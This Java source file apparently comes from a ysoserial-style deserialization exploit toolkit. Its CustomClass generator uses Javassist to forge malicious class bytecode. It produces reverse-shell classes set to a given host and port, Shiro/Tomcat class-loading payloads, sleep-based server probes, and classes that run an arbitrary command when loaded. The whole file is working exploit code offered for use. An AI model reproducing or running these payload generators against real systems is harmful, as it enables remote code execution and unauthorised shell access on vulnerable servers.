package cn.butler.thirdparty.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.thirdparty.payloads.Template.ServerDetectorSleepTemplate;
import cn.butler.thirdparty.payloads.custom.*;
import cn.butler.thirdparty.payloads.custom.CommandConstant;
import cn.butler.yso.payloads.util.CommonUtil;
import cn.butler.yso.payloads.util.Reflections;
import javassist.*;
import cn.butler.thirdparty.payloads.custom.ClassHandleUtil;
import cn.butler.thirdparty.payloads.custom.CommandlUtil;
import cn.butler.thirdparty.payloads.Template.ReverseShellClassTemplate;
import cn.butler.yso.payloads.util.BASE64Decoder;

public class CustomClass implements ObjectPayload<Object> {
    @Override
    public Object[] getObject(String command) throws Exception {
        String tmplClazzName = "T" + System.nanoTime();
        byte[] classBytes = null;

        if(command.toLowerCase().startsWith(CommandConstant.COMMAND_CLASS_FILE)){
            classBytes = CommonUtil.readFileByte(command.substring(CommandConstant.COMMAND_CLASS_FILE.length()));
            tmplClazzName = ClassHandleUtil.getClassNameByByteCode(classBytes);
        }else if(command.toLowerCase().startsWith(CommandConstant.COMMAND_CLASS_BASE64)) {
            classBytes = new BASE64Decoder().decodeBuffer(command.substring(CommandConstant.COMMAND_CLASS_BASE64.length()));
            tmplClazzName = ClassHandleUtil.getClassNameByByteCode(classBytes);
        }else if(command.toLowerCase().startsWith(CommandConstant.COMMAND_SHIRO_TOMCAT_LOADCLASS)){
            String parameter = command.substring(CommandConstant.COMMAND_SHIRO_TOMCAT_LOADCLASS.length());
            return TomcatShiroLoadClassTemplate.loadClassDataForTomcatShiro(parameter);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_REVERSESHELL)) {
            String ipAndPort = command.substring(CommandConstant.COMMAND_REVERSESHELL.length());
            String[] parts = ipAndPort.split(":");
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.get(ReverseShellClassTemplate.class.getName());
            ctClass.replaceClassName(ctClass.getName(), tmplClazzName);
            Reflections.setFieldValueForCtClass(ctClass, "host", CtField.Initializer.constant(parts[0]));
            Reflections.setFieldValueForCtClass(ctClass, "port", CtField.Initializer.constant(Integer.parseInt(parts[1])));
            ctClass.defrost(); // 允许对类进行修改（defrost 解冻状态）
            ctClass.getClassFile().setVersionToJava5(); // JDK5以提高兼容性
            classBytes = ctClass.toBytecode();
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_SLEEP_DETECT_CLASS)) {
            String classNameAndseconds = command.substring(CommandConstant.COMMAND_SLEEP_DETECT_CLASS.length());
            String[] parts = classNameAndseconds.split(":");
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.get(ServerDetectorSleepTemplate.class.getName());
            ctClass.replaceClassName(ctClass.getName(), tmplClazzName);
            Reflections.setFieldValueForCtClass(ctClass, "className", CtField.Initializer.constant(parts[0])); //类名
            Reflections.setFieldValueForCtClass(ctClass, "seconds", CtField.Initializer.constant(Integer.parseInt(parts[1]))); //秒数
            ctClass.defrost(); // 允许对类进行修改（defrost 解冻状态）
            ctClass.getClassFile().setVersionToJava5(); // JDK5以提高兼容性
            classBytes = ctClass.toBytecode();
        } else {
            String cmd = CommandlUtil.getCmd(command);
            //简单的字节码处理
            ClassPool classPool = new ClassPool();
            classPool.appendSystemPath(); // 添加系统路径，确保基础类可用
            final CtClass ctClass = classPool.makeClass(tmplClazzName);
            ctClass.defrost(); // 允许对类进行修改（defrost 解冻状态）
//            ctClass.makeClassInitializer().insertAfter(String.format("new %s();",tmplClazzName)); // 添加类初始化器，并在类加载时执行命令
            // 为类添加一个默认的构造方法
            CtConstructor constructor = new CtConstructor(new CtClass[]{}, ctClass);
            ctClass.addConstructor(constructor);
            constructor.setBody("{}"); // 给构造方法添加一个空的方法体
            constructor.insertAfter(cmd); // 在构造方法前插入代码
            ctClass.makeClassInitializer().insertBefore(String.format("new %s();",tmplClazzName));
            ctClass.getClassFile().setVersionToJava5();
            classBytes = ctClass.toBytecode();
        }

        return new Object[]{tmplClazzName, classBytes};
    }

    public static void main(String[] args) {
    }
}
